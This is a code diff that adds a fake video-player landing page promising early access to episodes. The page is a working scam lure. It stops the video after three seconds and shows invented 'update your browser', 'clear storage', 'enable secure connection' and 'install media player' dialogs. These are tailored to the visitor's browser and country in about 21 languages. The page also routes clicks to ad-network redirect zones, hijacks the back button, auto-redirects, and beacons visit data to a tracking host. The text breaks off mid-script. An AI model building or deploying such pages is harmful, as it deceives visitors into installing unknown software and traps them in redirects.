@@ -8,7 +8,502 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <title>EARLY ACCESS | Private Premiere: All Episodes Online 🎬</title>
 
+  <link rel="icon" type="image/svg+xml" href="./assets/favicon/favicon.svg" /><!doctype html>
+<html lang="en" data-landing-name="player-v2">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0" />
+  <link rel="preload" href="./assets/poster-3s.webp" as="image" />
+  <meta name="theme-color" content="#000000">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <title>EARLY ACCESS | Private Premiere: All Episodes Online 🎬</title>
+
   <link rel="icon" type="image/svg+xml" href="./assets/favicon/favicon.svg" />
+
+  <script>
+    var APP_CONFIG = {
+      domain: "https://jup9.com",
+      mainExit_currentTab_zoneId: 10576293,
+      mainExit_newTab_zoneId: 10576292,
+      tabUnderClick_zoneId: 10576300,
+      reverse_zoneId: 10576291,
+      back_zoneId: 10576297,
+      back_count: 8,
+      autoexit_zoneId: 10576295,
+      autoexit_timeToRedirect: 40,
+      ageExit_currentTab_zoneId: 10576302,
+      ageExit_newTab_zoneId: 10576301
+    };
+  </script>
+
+  <script>
+    "use strict";
+    (() => {
+      const now = () => new Date().toISOString();
+      const p = new URL(location.href).searchParams;
+      window.syncMetric = ({ event, exitZoneId }) => {
+        const payload = [{
+          app: "landings-player",
+          event,
+          landing_url: location.href,
+          exit_zone_id: exitZoneId ? Number(exitZoneId) : undefined,
+          landing_load_date_time: now(),
+          sub_id: p.get("var_1") || ""
+        }];
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon("https://wuytl.com/sync-metrics", JSON.stringify(payload));
+        }
+      };
+      window.syncMetric({ event: "start" });
+    })();
+  </script>
+
+  <script>
+    "use strict";
+    (function () {
+      const sp = new URL(location.href).searchParams;
+
+      const detectLang = () => {
+        // Приоритет 1: Ссылка
+        const q = (sp.get("lang") || sp.get("l") || "").trim().toLowerCase();
+        if (q) return q;
+        // Приоритет 2: Реальный язык браузера (игнорируем тег html lang="en")
+        return (navigator.language || "en").toLowerCase();
+      };
+
+      const norm = (l) => {
+        l = (l || "").toLowerCase();
+        if (l === "ua") l = "uk";
+        if (l === "cz") l = "cs";
+        if (l.includes("-")) l = l.split("-")[0];
+        return l;
+      };
+
+      const getBrowserName = () => {
+          const ua = navigator.userAgent;
+          if (ua.includes("Firefox")) return "Firefox";
+          if (ua.includes("SamsungBrowser")) return "Samsung Browser";
+          if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+          if (ua.includes("Edge")) return "Edge";
+          if (ua.includes("Chrome")) return "Chrome";
+          if (ua.includes("Safari")) return "Safari";
+          return "Browser";
+      };
+
+      const fetchCountryName = async (targetLang) => {
+          try {
+              const manual = sp.get('geo') || sp.get('country');
+              if (manual) return manual;
+              // Запрос к Cloudflare cgi-trace (моментально и без лимитов)
+              const response = await fetch('/cdn-cgi/trace');
+              const text = await response.text();
+              const locLine = text.split('\n').find(line => line.startsWith('loc='));
+              const code = locLine ? locLine.split('=')[1] : null;
+              if (code) {
+                  const displayNames = new Intl.DisplayNames([targetLang], { type: 'region' });
+                  return displayNames.of(code);
+              }
+              return null;
+          } catch (e) { return null; }
+      };
+
+      const MODAL_I18N = {
+        en: {
+          title: "Leaving already? 😢", desc: "Wait—video is almost loaded.", stay: "Stay", leave: "Leave",
+          t1: { h: "{browser} Update Required", t: "Your version of {browser} is no longer supported. Please update your browser to play this video.", b: "UPDATE", c: "CANCEL" },
+          t2: { h: "Storage limit reached", t: "To continue playback, please clear your {browser} cache or system junk files.", b: "CLEAR NOW", c: "CANCEL" },
+          t3: { h: "Content restricted", t: "This media is restricted in {country}. Please enable secure connection to watch.", b: "ENABLE", c: "CANCEL" },
+          t4: { h: "Playback Error", t: "A newer version of the media player is required to play this content.", b: "INSTALL", c: "CANCEL" }
+        },
+        es: {
+          title: "¿Ya te vas? 😢", desc: "Espera: el video casi se ha cargado.", stay: "Quedarme", leave: "Salir",
+          t1: { h: "Actualización necesaria", t: "Tu versión de {browser} ya no es compatible. Actualiza tu navegador para reproducir este video.", b: "ACTUALIZAR", c: "CANCELAR" },
+          t2: { h: "Memoria llena", t: "Para continuar, borra la caché de {browser} o los archivos basura del sistema.", b: "LIMPIAR", c: "CANCELAR" },
+          t3: { h: "Contenido restringido", t: "Este medio está restringido en {country}. Habilita la conexión segura para ver.", b: "HABILITAR", c: "CANCELAR" },
+          t4: { h: "Error de reproducción", t: "Se requiere una versión más reciente del reproductor multimedia.", b: "INSTALAR", c: "CANCELAR" }
+        },
+        pt: {
+          title: "Já vai embora? 😢", desc: "Espera — o vídeo quase carregou.", stay: "Ficar", leave: "Sair",
+          t1: { h: "Atualização necessária", t: "Sua versão do {browser} não é mais suportada. Atualize seu navegador para assistir.", b: "ATUALIZAR", c: "CANCELAR" },
+          t2: { h: "Limite de armazenamento", t: "Para continuar, limpe o cache do {browser} ou arquivos inúteis do sistema.", b: "LIMPAR", c: "CANCELAR" },
+          t3: { h: "Conteúdo restrito", t: "Este conteúdo é restrito em: {country}. Ative a conexão segura para assistir.", b: "ATIVAR", c: "CANCELAR" },
+          t4: { h: "Erro de reprodução", t: "Uma versão mais recente do player é necessária para reproduzir este conteúdo.", b: "INSTALAR", c: "CANCELAR" }
+        },
+        ru: {
+          title: "Уже уходишь? 😢", desc: "Подожди! Видео почти загрузилось.", stay: "Остаться", leave: "Уйти",
+          t1: { h: "Обновите {browser}", t: "Ваша версия {browser} больше не поддерживается. Обновите браузер для просмотра.", b: "ОБНОВИТЬ", c: "ОТМЕНА" },
+          t2: { h: "Память переполнена", t: "Для продолжения очистите кэш {browser} или системный мусор.", b: "ОЧИСТИТЬ", c: "ОТМЕНА" },
+          t3: { h: "Доступ ограничен", t: "Этот контент недоступен в регионе {country}. Включите безопасное соединение.", b: "ВКЛЮЧИТЬ", c: "ОТМЕНА" },
+          t4: { h: "Ошибка декодирования", t: "Для воспроизведения этого контента требуется обновить медиа-компоненты.", b: "УСТАНОВИТЬ", c: "ОТМЕНА" }
+        },
+        uk: {
+          title: "Вже йдеш? 😢", desc: "Зачекай! Відео майже завантажилось.", stay: "Залишитись", leave: "Вийти",
+          t1: { h: "Оновіть {browser}", t: "Ваша версія {browser} застаріла. Оновіть браузер для перегляду.", b: "ОНОВИТИ", c: "СКАСУВАТИ" },
+          t2: { h: "Пам'ять переповнена", t: "Для продовження очистіть кеш {browser} або системне сміття.", b: "ОЧИСТИТИ", c: "СКАСУВАТИ" },
+          t3: { h: "Доступ обмежено", t: "Цей контент недоступний у регіоні {country}. Увімкніть безпечне з'єднання.", b: "УВІМКНУТИ", c: "СКАСУВАТИ" },
+          t4: { h: "Помилка відтворення", t: "Для відтворення потрібно оновити медіа-компоненти.", b: "ВСТАНОВИТИ", c: "СКАСУВАТИ" }
+        },
+        de: {
+          title: "Gehst du schon? 😢", desc: "Warte — das Video ist fast geladen.", stay: "Bleiben", leave: "Verlassen",
+          t1: { h: "{browser}-Update erforderlich", t: "Ihre Version von {browser} wird nicht mehr unterstützt. Bitte aktualisieren Sie Ihren Browser.", b: "AKTUALISIEREN", c: "ABBRECHEN" },
+          t2: { h: "Speicher voll", t: "Bitte leeren Sie Ihren {browser}-Cache oder Systemdateien, um fortzufahren.", b: "BEREINIGEN", c: "ABBRECHEN" },
+          t3: { h: "Inhalt eingeschränkt", t: "Dieser Inhalt ist in {country} nicht verfügbar. Aktivieren Sie eine sichere Verbindung.", b: "AKTIVIEREN", c: "ABBRECHEN" },
+          t4: { h: "Wiedergabefehler", t: "Eine neuere Version des Media Players ist erforderlich.", b: "INSTALLIEREN", c: "ABBRECHEN" }
+        },
+        fr: {
+          title: "Tu pars déjà ? 😢", desc: "Attends — la vidéo est presque chargée.", stay: "Rester", leave: "Quitter",
+          t1: { h: "Mise à jour requise", t: "Votre version de {browser} n'est plus supportée. Mettez à jour votre navigateur.", b: "METTRE À JOUR", c: "ANNULER" },
+          t2: { h: "Mémoire saturée", t: "Pour continuer, videz le cache de {browser} ou les fichiers inutiles.", b: "NETTOYER", c: "ANNULER" },
+          t3: { h: "Contenu restreint", t: "Ce contenu est restreint en : {country}. Activez la connexion sécurisée.", b: "ACTIVER", c: "ANNULER" },
+          t4: { h: "Erreur de lecture", t: "Une version plus récente du lecteur est requise.", b: "INSTALLER", c: "ANNULER" }
+        },
+        it: {
+          title: "Vai già via? 😢", desc: "Aspetta — il video è quasi caricato.", stay: "Resta", leave: "Esci",
+          t1: { h: "Aggiornamento richiesto", t: "La tua versione di {browser} non è più supportata. Aggiorna il browser.", b: "AGGIORNA", c: "ANNULLA" },
+          t2: { h: "Memoria piena", t: "Per continuare, svuota la cache di {browser} o i file inutili.", b: "PULISCI", c: "ANNULLA" },
+          t3: { h: "Contenuto limitato", t: "Questo contenuto è limitato in: {country}. Attiva la connessione sicura.", b: "ATTIVA", c: "ANNULLA" },
+          t4: { h: "Errore di riproduzione", t: "È necessaria una versione più recente del lettore.", b: "INSTALLA", c: "ANNULLA" }
+        },
+        tr: {
+          title: "Şimdiden gidiyor musun? 😢", desc: "Bekle — video neredeyse yüklendi.", stay: "Kal", leave: "Çık",
+          t1: { h: "{browser} Güncellemesi", t: "{browser} sürümünüz artık desteklenmiyor. Videoyu izlemek için tarayıcınızı güncelleyin.", b: "GÜNCELLE", c: "İPTAL" },
+          t2: { h: "Depolama dolu", t: "Devam etmek için {browser} önbelleğini veya gereksiz dosyaları temizleyin.", b: "TEMİZLE", c: "İPTAL" },
+          t3: { h: "İçerik kısıtlandı", t: "Bu içerik {country} bölgesinde kısıтlıdır. İzlemek için güvenli bağlantıyı açın.", b: "AÇ", c: "İPTAL" },
+          t4: { h: "Oynatma Hatası", t: "Bu içeriği oynatmak için medya oynatıcının güncellenmesi gerekiyor.", b: "YÜKLE", c: "İPTAL" }
+        },
+        pl: {
+          title: "Już wychodzisz? 😢", desc: "Poczekaj — wideo prawie się załadowało.", stay: "Zostań", leave: "Wyjdź",
+          t1: { h: "Wymagana aktualizacja", t: "Twoja wersja {browser} nie jest obsługiwana. Zaktualizuj przeglądarkę.", b: "AKTUALIZUJ", c: "ANULUJ" },
+          t2: { h: "Pamięć pełna", t: "Aby kontynuować, wyczyść pamięć podręczną {browser} lub pliki śmieci.", b: "CZYŚĆ TERAZ", c: "ANULUJ" },
+          t3: { h: "Treść ograniczona", t: "Te media są ograniczone w: {country}. Włącz bezpieczne połączenie.", b: "WŁĄCZ", c: "ANULUJ" },
+          t4: { h: "Błąd odtwarzania", t: "Wymagana jest nowsza wersja odtwarzacza multimedialnego.", b: "INSTALUJ", c: "ANULUJ" }
+        },
+        ro: {
+          title: "Pleci deja? 😢", desc: "Așteaptă — videoclipul aproape s-a încărcat.", stay: "Rămân", leave: "Ies",
+          t1: { h: "Actualizare necesară", t: "Versiunea ta de {browser} nu mai este suportată. Actualizează browserul.", b: "ACTUALIZARE", c: "ANULARE" },
+          t2: { h: "Memorie plină", t: "Pentru a continua, șterge cache-ul {browser} sau fișierele inutile.", b: "CURĂȚĂ", c: "ANULARE" },
+          t3: { h: "Conținut restricționat", t: "Acest conținut este restricționat în {country}. Activează conexiunea sigură.", b: "ACTIVARE", c: "ANULARE" },
+          t4: { h: "Eroare redare", t: "Este necesară o versiune mai nouă a playerului media.", b: "INSTALARE", c: "ANULARE" }
+        },
+        hu: {
+          title: "Már mész? 😢", desc: "Várj — a videó majdnem betöltött.", stay: "Maradok", leave: "Kilépek",
+          t1: { h: "Frissítés szükséges", t: "A {browser} verziója elavult. Frissítse a böngészőt a videó megtekintéséhez.", b: "FRISSÍTÉS", c: "MÉGSE" },
+          t2: { h: "Megtelt a memória", t: "A folytatáshoz törölje a {browser} gyorsítótárát vagy a felesleges fájlokat.", b: "TISZTÍTÁS", c: "MÉGSE" },
+          t3: { h: "Korlátozott tartalom", t: "Ez a tartalom korlátozott itt: {country}. Engedélyezze a biztonságos kapcsolatot.", b: "ENGEDÉLYEZÉS", c: "MÉGSE" },
+          t4: { h: "Lejátszási hiba", t: "A tartalom lejátszásához frissebb médialejátszó szükséges.", b: "TELEPÍTÉS", c: "MÉGSE" }
+        },
+        cs: {
+          title: "Už odcházíš? 😢", desc: "Počkej — video je téměř načtené.", stay: "Zůstat", leave: "Odejít",
+          t1: { h: "Vyžadována aktualizace", t: "Vaše verze {browser} již není podporována. Aktualizujte prohlížeč.", b: "AKTUALIZOVAT", c: "ZRUŠIT" },
+          t2: { h: "Plná paměť", t: "Pro pokračování vymažte mezipaměť {browser} nebo nepotřebné soubory.", b: "VYČISTIT", c: "ZRUŠIT" },
+          t3: { h: "Omezený obsah", t: "Tento obsah je v {country} omezen. Povolte zabezpečené připojení.", b: "POVOLIT", c: "ZRUŠIT" },
+          t4: { h: "Chyba přehrávání", t: "K přehrání je vyžadována novější verze přehrávače.", b: "INSTALOVAT", c: "ZRUŠIT" }
+        },
+        id: {
+          title: "Sudah mau pergi? 😢", desc: "Tunggu — video hampir siap.", stay: "Tetap", leave: "Keluar",
+          t1: { h: "Pembaruan Diperlukan", t: "Versi {browser} Anda tidak lagi didukung. Perbarui browser untuk memutar video.", b: "PERBARUI", c: "BATAL" },
+          t2: { h: "Penyimpanan Penuh", t: "Untuk melanjutkan, bersihkan cache {browser} atau file sampah sistem.", b: "BERSIHKAN", c: "BATAL" },
+          t3: { h: "Konten Dibatasi", t: "Media ini dibatasi di {country}. Aktifkan koneksi aman untuk menonton.", b: "AKTIFKAN", c: "BATAL" },
+          t4: { h: "Kesalahan Pemutaran", t: "Versi pemutar mediaที่ mới nhất diperlukan untuk memutar konten ini.", b: "INSTAL", c: "BATAL" }
+        },
+        th: {
+          title: "จะไปแล้วเหรอ? 😢", desc: "รอก่อน! วิดีโอใกล้โหลดเสร็จแล้ว", stay: "อยู่ต่อ", leave: "ออก",
+          t1: { h: "จำเป็นต้องอัปเดต", t: "{browser} ของคุณไม่รองรับอีกต่อไป โปรดอัปเดตเบราว์เซอร์เพื่อเล่นวิดีโอ", b: "อัปเดต", c: "ยกเลิก" },
+          t2: { h: "หน่วยความจำเต็ม", t: "เพื่อดำเนินการต่อ โปรดล้างแคช {browser} หรือไฟล์ขยะในระบบ", b: "ล้างทันที", c: "ยกเลิก" },
+          t3: { h: "เนื้อหาถูกจำกัด", t: "สื่อนี้ถูกจำกัดใน {country} โปรดเปิดใช้งานการเชื่อมต่อที่ปลอดภัย", b: "เปิดใช้งาน", c: "ยกเลิก" },
+          t4: { h: "ข้อผิดพลาดการเล่น", t: "จำเป็นต้องใช้โปรแกรมเล่นสื่อเวอร์ชันใหม่กว่าเพื่อเล่นเนื้อหานี้", b: "ติดตั้ง", c: "ยกเลิก" }
+        },
+        vi: {
+          title: "Bạn rời đi rồi sao? 😢", desc: "Đợi chút — video gần tải xong.", stay: "Ở lại", leave: "Rời đi",
+          t1: { h: "Cần cập nhật", t: "Phiên bản {browser} của bạn không còn được hỗ trợ. Vui lòng cập nhật trình duyệt.", b: "CẬP NHẬT", c: "HỦY" },
+          t2: { h: "Bộ nhớ đầy", t: "Để tiếp tục, vui lòng xóa bộ nhớ đệm {browser} hoặc các tập tin rác.", b: "DỌN DẸP", c: "HỦY" },
+          t3: { h: "Nội dung bị hạn chế", t: "Nội dung này bị hạn chế tại {country}. Vui lòng bật kết nối an toàn.", b: "BẬT", c: "HỦY" },
+          t4: { h: "Lỗi phát lại", t: "Cần có phiên bản trình phát đa phương tiện mới hơn để phát nội dung này.", b: "CÀI ĐẶT", c: "HỦY" }
+        },
+        ms: {
+          title: "Nak pergi sekarang? 😢", desc: "Tunggu — video hampir siap.", stay: "Tunggu", leave: "Keluar",
+          t1: { h: "Kemas Kini Diperlukan", t: "Versi {browser} anda tidak lagi disokong. Sila kemas kini pelayar.", b: "KEMAS KINI", c: "BATAL" },
+          t2: { h: "Storan Penuh", t: "Untuk meneruskan, sila bersihkan cache {browser} atau fail sampah.", b: "BERSIHKAN", c: "BATAL" },
+          t3: { h: "Kandungan Disekat", t: "Media ini disekat di {country}. Sila dayakan sambungan selamat.", b: "DAYAKAN", c: "BATAL" },
+          t4: { h: "Ralat Main Semula", t: "Versi pemain media yang lebih baharu diperlukan.", b: "PASANG", c: "BATAL" }
+        },
+        hi: {
+          title: "अभी जा रहे हो? 😢", desc: "रुको — वीडियो लगभग लोड हो गया है।", stay: "रुको", leave: "जाओ",
+          t1: { h: "अपडेट आवश्यक है", t: "आपका {browser} संस्करण अब समर्थित नहीं है। वीडियो चलाने के लिए ब्राउज़र अपडेट करें।", b: "अपडेट करें", c: "रद्द करें" },
+          t2: { h: "मेमोरी फुल है", t: "जारी रखने के लिए, कृपया {browser} कैश या जंक फ़ाइलें साफ़ करें।", b: "साफ़ करें", c: "रद्द करें" },
+          t3: { h: "सामग्री प्रतिबंधित", t: "यह मीडिया {country} में प्रतिबंधित है। देखने के लिए सुरक्षित कनेक्शन सक्षम करें।", b: "सक्षम करें", c: "रद्द करें" },
+          t4: { h: "प्लेबैक त्रुटि", t: "इस सामग्री को चलाने के लिए मीडिया प्लेयर का नया संस्करण आवश्यक है।", b: "इंस्टॉल करें", c: "रद्द करें" }
+        },
+        ar: {
+          title: "هل ستغادر الآن؟ 😢", desc: "انتظر — الفيديو أوشك على التحميل.", stay: "البقاء", leave: "مغادرة",
+          t1: { h: "التحديث مطلوب", t: "إصدار {browser} الخاص بك لم يعد مدعومًا. يرجى تحديث المتصفح لتشغيل الفيديو.", b: "تحديث", c: "إلغاء" },
+          t2: { h: "الذاكرة ممتلئة", t: "للمتابعة، يرجى مسح ذاكرة التخزين المؤقت لـ {browser} أو ملفات النظام غير الضرورية.", b: "تنظيف الآن", c: "إلغاء" },
+          t3: { h: "المحتوى مقيد", t: "هذا المحتوى مقيد في {country}. يرجى تمكين الاتصال الآمن للمشاهدة.", b: "تمكين", c: "إلغاء" },
+          t4: { h: "خطأ في التشغيل", t: "مطلوب إصدار أحدث من مشغل الوسائط لتشغيل هذا المحتوى.", b: "تثبيت", c: "إلغاء" }
+        },
+        bn: {
+          title: "এখনই চলে যাচ্ছো? 😢", desc: "একটু অপেক্ষা করো — ভিডিও প্রায় লোড হয়ে গেছে।", stay: "থাকি", leave: "চলে যাই",
+          t1: { h: "আপডেট প্রয়োজন", t: "আপনার {browser} সংস্করণটি আর সমর্থিত নয়। ভিডিও চালাতে ব্রাউজার আপডেট করুন।", b: "আপডেট করুন", c: "বাতিল" },
+          t2: { h: "মেমরি পূর্ণ", t: "চালিয়ে যেতে, দয়া করে {browser} ক্যাশ বা আবর্জনা ফাইল পরিষ্কার করুন।", b: "পরিষ্কার করুন", c: "বাতিল" },
+          t3: { h: "বিষয়বস্তু সীমাবদ্ধ", t: "এই মিডিয়া {country}-এ সীমাবদ্ধ। দেখতে নিরাপদ সংযোগ চালু করুন।", b: "চালু করুন", c: "বাতিল" },
+          t4: { h: "প্লেব্যাক ত্রুটি", t: "এই বিষয়বস্তু চালানোর জন্য মিডিয়া প্লেয়ারের নতুন সংস্করণ প্রয়োজন।", b: "ইনস্টল করুন", c: "বাতিল" }
+        }
+      };
+
+      window.__getModalCopy = function () {
+        const lang = norm(detectLang());
+        return MODAL_I18N[lang] || MODAL_I18N.en;
+      };
+
+      document.addEventListener("DOMContentLoaded", async () => {
+        const typeId = sp.get('type') || '4';
+        const browser = getBrowserName();
+        const langCode = norm(detectLang());
+        const dict = window.__getModalCopy(); 
+        
+        const countryName = await fetchCountryName(langCode);
+        const finalCountry = countryName || (langCode === 'ru' ? "вашем регионе" : "your region");
+
+        let content = dict['t' + typeId] || dict['t4'];
+        const textHead = content.h.replace(/{browser}/g, browser);
+        const textBody = content.t.replace(/{browser}/g, browser).replace(/{country}/g, finalCountry);
+
+        const elDialog = document.querySelector('.system-dialog');
+        const elHead = document.getElementById('lure-head');
+        const elText = document.getElementById('lure-text');
+        const elBtn  = document.getElementById('lure-btn');
+        const elCancel = document.getElementById('lure-cancel');
+
+        if (langCode === 'ar' && elDialog) {
+            elDialog.style.direction = 'rtl';
+            elDialog.style.textAlign = 'right';
+            const actions = elDialog.querySelector('.dialog-actions');
+            if (actions) actions.style.justifyContent = 'flex-start';
+        }
+
+        if (elHead) elHead.innerText = textHead;
+        if (elText) elText.innerText = textBody;
+        if (elBtn)  elBtn.innerText  = content.b;
+        if (elCancel) elCancel.innerText = content.c;
+      });
+    })();
+  </script>
+
+  <style>
+    html, body {
+      margin: 0; padding: 0;
+      width: 100%; height: 100vh;
+      background: #000;
+      overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    .xh-zone {
+      display: flex; align-items: center; justify-content: center;
+      cursor: pointer; pointer-events: auto;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .xh-zone svg { fill: #fff; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); }
+
+    .xh-top-left { position: fixed; top: 15px; left: 15px; z-index: 100; width: 52px; height: 52px; }
+    .xh-top-right {
+      position: fixed; top: 15px; right: 15px; z-index: 100; width: 48px; height: 48px;
+      border-radius: 50%; background: rgba(30,30,30,0.5); border: 1px solid rgba(255,255,255,0.1);
+    }
+
+    .xh-main-screen { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 10; }
+    .xh-video-container { width: 100%; max-width: 1220px; aspect-ratio: 16 / 9; position: relative; background: #000; }
+    .xh-video-element { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+    .xh-main-play-trigger {
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      width: auto; height: auto;
+      z-index: 20; opacity: 0; visibility: hidden; pointer-events: none;
+      transition: opacity 0.2s ease;
+    }
+
+    .xh-main-play-trigger.ready { opacity: 1; visibility: visible; pointer-events: auto; }
+
+    .system-dialog {
+        background: #ffffff; border-radius: 8px; padding: 24px; width: 300px;
+        box-shadow: 0 12px 32px rgba(0,0,0,0.4); text-align: left; color: #202124;
+    }
+
+    .dialog-title { font-size: 19px; font-weight: 500; margin-bottom: 12px; color: #000; }
+    .dialog-text { font-size: 14px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
+    .dialog-actions { display: flex; justify-content: flex-end; gap: 8px; }
+    
+    .dialog-btn {
+        background: transparent; color: #1a73e8; border: none; padding: 10px 16px;
+        font-size: 14px; font-weight: 600; cursor: pointer; text-transform: uppercase;
+        letter-spacing: 0.4px; border-radius: 4px;
+    }
+    .dialog-btn.btn-secondary { color: #5f6368; }
+    .dialog-btn:active { background: rgba(26, 115, 232, 0.1); }
+
+    .xh-bottom-interface {
+      position: fixed; left: 0; bottom: 0; width: 100%; z-index: 100;
+      padding: 0 10px 10px; box-sizing: border-box;
+      background: linear-gradient(0deg, #000 0%, rgba(0,0,0,0.8) 60%, transparent 100%);
+      pointer-events: none;
+    }
+
+    .xh-timeline-trigger { width: 100%; padding: 15px 0 10px; pointer-events: auto; }
+    .xh-line-bg { width: 100%; height: 4px; background: rgba(255,255,255,0.25); position: relative; }
+    .xh-line-fill { position: absolute; left: 0; top: 0; height: 100%; width: 5%; background: #f00; }
+    .xh-flex-row { display: flex; justify-content: space-between; align-items: center; }
+    .xh-side { display: flex; align-items: center; }
+    .xh-icon-zone { width: 52px; height: 52px; pointer-events: auto; }
+    .xh-icon-zone svg { width: 32px; height: 32px; }
+    .xh-time-display { color: #fff; font-size: 16px; font-weight: 500; padding: 0 5px; }
+
+    .xh-modal { position: fixed; inset: 0; z-index: 99999; display: none; align-items: center; justify-content: center; }
+    .xh-modal-overlay { position: absolute; inset: 0; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(4px); }
+    .xh-modal-content {
+      position: relative; z-index: 100000; width: 85%; max-width: 300px;
+      background: #1c1c1c; border: 1px solid #333; border-radius: 14px;
+      padding: 24px; text-align: center; color: #fff;
+    }
+    .xh-modal-title { font-size: 20px; font-weight: 700; margin-bottom: 10px; }
+    .xh-modal-desc { font-size: 14px; color: #aaa; margin-bottom: 20px; line-height: 1.4; }
+    .xh-modal-actions { display: flex; flex-direction: column; gap: 10px; }
+    .xh-btn { border: none; outline: none; padding: 12px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
+    .xh-btn-primary { background: #e50914; color: #fff; }
+    .xh-btn-secondary { background: #333; color: #ccc; }
+  </style>
+</head>
+
+<body>
+  <div class="xh-zone xh-top-left" data-target="back_button" aria-label="Back">
+    <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+  </div>
+
+  <div class="xh-zone xh-top-right" data-target="pip_top" aria-label="PiP">
+    <svg viewBox="0 0 24 24"><path d="M19 7h-8v6h8V7zm2-4H3c-1.1 0-2 .9-2 2v14c0 1.1.9 1.98 2 1.98h18c1.1 0 2-.88 2-1.98V5c0-1.1-.9-2-2-2zm0 16.01H3V4.98h18v14.03z"/></svg>
+  </div>
+
+  <div class="xh-main-screen">
+    <div class="xh-video-container">
+      <video class="xh-video-element" playsinline muted preload="auto" data-poster="./assets/poster-3s.webp">
+        <source src="./vid.mp4" type="video/mp4" />
+      </video>
+
+      <div class="xh-zone xh-main-play-trigger" data-target="main_play" aria-label="System Message">
+         <div class="system-dialog">
+            <div class="dialog-title" id="lure-head">System Message</div>
+            <div class="dialog-text" id="lure-text">Please take action to continue.</div>
+            <div class="dialog-actions">
+                <button class="dialog-btn btn-secondary" id="lure-cancel" data-target="main_play">CANCEL</button>
+                <button class="dialog-btn" id="lure-btn" data-target="main_play">OK</button>
+            </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="xh-bottom-interface">
+    <div class="xh-zone xh-timeline-trigger" data-target="timeline">
+      <div class="xh-line-bg"><div class="xh-line-fill"></div></div>
+    </div>
+    <div class="xh-flex-row">
+      <div class="xh-side">
+        <div class="xh-zone xh-icon-zone" data-target="play_pause"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+        <div class="xh-zone xh-icon-zone" data-target="mute_unmute">
+          <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
+        </div>
+        <div class="xh-time-display">0:03 / 8:32</div>
+      </div>
+      <div class="xh-side">
+        <div class="xh-zone xh-icon-zone" data-target="pip_bottom"><svg viewBox="0 0 24 24"><path d="M19 11h-8v6h8v-6zm4-7V16c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h18c1.1 0 2 .9 2 2zm-2 0H3v12h18V4z"/></svg></div>
+        <div class="xh-zone xh-icon-zone" data-target="settings"><svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.5c-1.93 0-3.5-1.57-3.5-3.5s1.57-3.5 3.5-3.5 3.5 1.57 3.5 3.5-1.57 3.5-3.5 3.5z"/></svg></div>
+        <div class="xh-zone xh-icon-zone" data-target="fullscreen"><svg viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zM14 5v2h3v3h2V5h-5z"/></svg></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="xh_exit_modal" class="xh-modal" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="xh-modal-overlay" data-target="modal_stay"></div>
+    <div class="xh-modal-content">
+      <div class="xh-modal-title" data-i18n="title"></div>
+      <div class="xh-modal-desc" data-i18n="desc"></div>
+      <div class="xh-modal-actions">
+        <button class="xh-btn xh-btn-primary" data-target="modal_stay" data-i18n="stay"></button>
+        <button class="xh-btn xh-btn-secondary" data-target="modal_leave" data-i18n="leave"></button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    "use strict";
+    document.addEventListener("DOMContentLoaded", () => {
+      const video = document.querySelector(".xh-video-element");
+      const playBtn = document.querySelector(".xh-main-play-trigger");
+      if (!video || !playBtn) return;
+      const sp = new URL(location.href).searchParams;
+      const STOP_AT = 3.0;
+      const startTime = parseFloat(sp.get("t")) || 0;
+      const POSTER = sp.get("__poster") || video.getAttribute("data-poster") || "./assets/poster-3s.webp";
+
+      if (sp.get("__cl") === "1" || sp.get("__skipPreview") === "1") {
+        try { video.pause(); } catch {}
+        try { video.currentTime = startTime; video.setAttribute("poster", POSTER); video.load(); } catch {}
+        playBtn.classList.add("ready");
+        return;
+      }
+
+      let done = false;
+      const cleanup = () => {
+        clearTimeout(hardFallback); clearTimeout(playWatchdog);
+        video.removeEventListener("timeupdate", onTime);
+      };
+
+      const finish = () => {
+        if (done) return; done = true;
